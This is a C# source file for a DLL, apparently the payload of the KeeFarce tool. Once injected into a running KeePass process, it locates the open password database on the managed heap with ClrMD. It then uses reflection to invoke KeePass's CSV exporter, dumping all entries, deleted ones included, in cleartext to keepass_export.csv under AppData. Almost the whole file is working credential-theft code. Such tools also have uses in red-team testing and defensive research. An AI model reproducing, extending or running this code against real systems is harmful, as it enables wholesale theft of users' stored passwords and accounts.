using System;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using Microsoft.Diagnostics.Runtime;

namespace KeeFarceDLL
{
    public static class KeeFarce
    {
        public static bool is64Bit = IntPtr.Size == 8;
        public static string exportFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "keepass_export.csv");

        public static int EntryPoint(string pwzArgument)
        {
            Debug.WriteLine("[KeeFarceDLL] Starting");
            //string processName = Process.GetCurrentProcess().ProcessName;
            //MessageBox.Show("The current process is " + processName + " and I am running C# code! Yuss!");

            if (is64Bit)
            {
                Debug.WriteLine("[KeeFarceDLL] Target is 64 bit");
            }

            // Retrieve the DocumentManagerEx object off the heap
            // TODO: KeePass can support multiple password files , so should probably modify this to load 
            // ALL of the DocumentManagerEx's into a list and process 'em, as opposed to just breaking
            // after finding the first one.
            IntPtr docManagerPtr = IntPtr.Zero;
            using (DataTarget dataTarget = DataTarget.AttachToProcess(Process.GetCurrentProcess().Id, 5000, AttachFlag.Passive))
            {
                string dacLocation = dataTarget.ClrVersions[0].TryGetDacLocation();
                ClrRuntime runtime = CreateRuntimeHack(dataTarget, dacLocation, 4, 5);
                Debug.WriteLine("[KeeFarceDLL] Attached to process.");

                ClrHeap heap = runtime.GetHeap();
                foreach (ulong obj in heap.EnumerateObjects())
                {
                    
                    ClrType type = heap.GetObjectType(obj);
                    
                    ulong size = type.GetSize(obj);
                    if (type.Name == "KeePass.UI.DocumentManagerEx")
                    {
                        Debug.WriteLine("[KeeFarceDLL] Found DocumentManagerEx at: " + obj.ToString("X") + " " + type.Name);
                        docManagerPtr = (IntPtr)obj;
                        break;
                    }
                }
                
                if(docManagerPtr == IntPtr.Zero) {
                    // Didn't find a document manager, time to return.
                    Debug.WriteLine("[KeeFarceDLL] No DocumentManagerEx found");
                    return 1;
                }

            }
 
            // Get the DocumentManagerEx object
            Converter<object> ptrconv = new Converter<object>();
            object documentManagerEx = ptrconv.ConvertFromIntPtr(docManagerPtr);
            var info = new DocumentManagerExInfo(documentManagerEx);
            int r = doExport(info.ActiveDatabase, info.RootGroup, exportFile);

            return r;
        }
       
        private static int doExport(object activeDb, object rootGroup, string exportFile)
        {
            // Get type from the current assembly
            Debug.WriteLine("[KeeFarceDLL] attempting reflection...");
            Assembly assembly = Assembly.Load("KeePass");
            Type pwExportType = assembly.GetType("KeePass.DataExchange.PwExportInfo"); 

            if(pwExportType == null)
            {
                Debug.WriteLine("[KeeFarceDLL] Could not get KeePass.DataExchange.PwExportInfo type");
                return 1;
            }

            object[] pwExportInfoParams = new object[3];
            pwExportInfoParams[0] = rootGroup; // root group
            pwExportInfoParams[1] = activeDb; // active db
            pwExportInfoParams[2] = true; // export deleted shiz
            Debug.WriteLine("[KeeFarceDLL] Spawning Constructor...");
            object pwExportInfo = Activator.CreateInstance(pwExportType, pwExportInfoParams);  

            if(pwExportInfo == null)
            {
                Debug.WriteLine("[KeeFarceDLL] Could not create PwExportInfo object");
                return 1;
            }


            // Create the file format provider
            Debug.WriteLine("[KeeFarceDLL] getting KeePassCsv1x type...");
            Type fileProvType = assembly.GetType("KeePass.DataExchange.Formats.KeePassCsv1x"); 

            if (fileProvType == null)
            {
                Debug.WriteLine("[KeeFarceDLL] Could not get KeePass.DataExchange.Formats.KeePassCsv1x type");
                return 1;
            }

            Debug.WriteLine("[KeeFarceDLL] creating KeePassCsv1x instance...");
            object fileProvProvider = Activator.CreateInstance(fileProvType, null); 

            if(fileProvProvider == null)
            {
                Debug.WriteLine("[KeeFarceDLL] Could not create KeePassCsv1x object");
                return 1;
            }


            // Export parameters
            object[] exportParams = new object[3];
            exportParams[0] = pwExportInfo; // pw export info
            exportParams[1] = new FileStream(exportFile, FileMode.Create); ; // destination file 
            exportParams[2] = null; // logger
            Debug.WriteLine("[KeeFarceDLL] getting export method.");
            MethodInfo exportMethodInfo = fileProvType.GetMethod("Export"); 

            if(exportMethodInfo == null)
            {
                Debug.WriteLine("[KeeFarceDLL] Could not get method 'Export' from KeePassCsv1x object");
                return 1;
            }

            Debug.WriteLine("[KeeFarceDLL] calling export method.");
            var result = exportMethodInfo.Invoke(fileProvProvider, exportParams);
            return 0;
        }

        private static ClrRuntime CreateRuntimeHack(this DataTarget target, string dacLocation, int major, int minor)
        {
            string dacFileNoExt = Path.GetFileNameWithoutExtension(dacLocation);
            if (dacFileNoExt.Contains("mscordacwks") && major == 4 && minor >= 5)
            {
                Type dacLibraryType = typeof(DataTarget).Assembly.GetType("Microsoft.Diagnostics.Runtime.DacLibrary");
                object dacLibrary = Activator.CreateInstance(dacLibraryType, target, dacLocation);
                Type v45RuntimeType = typeof(DataTarget).Assembly.GetType("Microsoft.Diagnostics.Runtime.Desktop.V45Runtime");
                object runtime = Activator.CreateInstance(v45RuntimeType, target, dacLibrary);
                return (ClrRuntime)runtime;
            }
            else
            {
                return target.CreateRuntime(dacLocation);
            }
        }

        private class DocumentManagerExInfo
        {
            private const string ActiveDocumentName = "ActiveDocument";
            private const string ActiveDatabaseName = "ActiveDatabase";
            private const string RootGroupName = "RootGroup";

            private readonly object documentManagerEx;
            public object ActiveDocument { get; private set; }
            public object ActiveDatabase { get; private set; }
            public object RootGroup { get; private set; }

            public DocumentManagerExInfo(object documentManagerEx)
            {
                if (documentManagerEx == null)
                {
                    throw new ArgumentNullException("documentManagerEx");
                }
                this.documentManagerEx = documentManagerEx;

                Type documentType = documentManagerEx.GetType();

                var property = documentType.GetProperty(ActiveDatabaseName);
                ActiveDatabase = property.GetValue(documentManagerEx, null);

                property = documentType.GetProperty(ActiveDocumentName);
                ActiveDocument = property.GetValue(documentManagerEx, null);

                Type databaseType = ActiveDatabase.GetType();
                property = databaseType.GetProperty(RootGroupName);
                RootGroup = property.GetValue(ActiveDatabase, null);

                Debug.WriteLine(string.Format("[KeeFarceDLL] Created DocumentManagerExInfo Got Database={0}; Got RootGroup={1}", ActiveDatabase != null, RootGroup != null));
            }
        }

    }
}
